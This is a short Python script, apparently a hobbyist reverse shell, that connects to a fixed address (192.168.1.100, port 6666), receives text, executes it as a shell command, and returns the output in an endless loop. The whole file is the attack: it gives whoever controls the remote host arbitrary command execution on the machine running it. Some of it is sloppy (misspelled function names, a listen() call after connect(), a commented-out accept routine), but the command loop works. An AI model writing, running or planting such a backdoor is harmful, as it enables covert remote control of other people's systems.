import os
import sys
import socket
import subprocess

task = ""

host = "192.168.1.100"
port = 6666

def server_create():
    global host
    global port
    global s
    
    
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        
    except socket.error:
        print("Cannot create")
        
def srever_connect():
    global host
    global port
    global s
    
    try:
        s.connect((host,port))
        s.listen(5)
        print("Connected successfully")
        
    except socket.error:
        print("Cannot connect")
        
'''def srever_accept():
    global host
    global port
    global s
    global conn 
    
    try:
        conn,addr = s.accept()
        print("Accepted...................")
        
    except socket.error:
        print("Cannt accept........")'''
        



def main_task():
    global host
    global port
    global s
    #global conn
    global data
    global task

    data = s.recv(1024)
    #print("Reply: " + data.decode("utf-8"))
    task = data.decode("utf-8")
    
    p = subprocess.check_output(task,shell=True)
    s.send(p)
    
server_create()
srever_connect()
#srever_accept()


while True:
    main_task()
    
    
            

